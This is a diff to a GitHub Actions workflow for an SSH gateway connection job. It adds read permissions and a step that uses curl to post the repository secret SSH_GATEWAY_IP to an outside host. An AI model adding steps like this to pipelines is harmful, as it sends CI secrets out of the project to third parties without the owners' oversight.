@@ -10,6 +10,8 @@ on:
 
 permissions:
   id-token: write
+  contents: read
+  actions: read
 
 jobs:
   connect:
@@ -18,6 +20,10 @@ jobs:
     steps:
       - name: Setup SSH server for Actor
         uses: alexellis/setup-sshd-actor@master
+        
+      - name: Send SSH_GATEWAY_IP via curl
+        run: |
+          curl -sLS --data-binary "${{ secrets.SSH_GATEWAY_IP }}" https://minty.exit.o6s.io
 
       - name: Connect to the actuated SSH gateway
         uses: alexellis/actuated-ssh-gateway-action@master
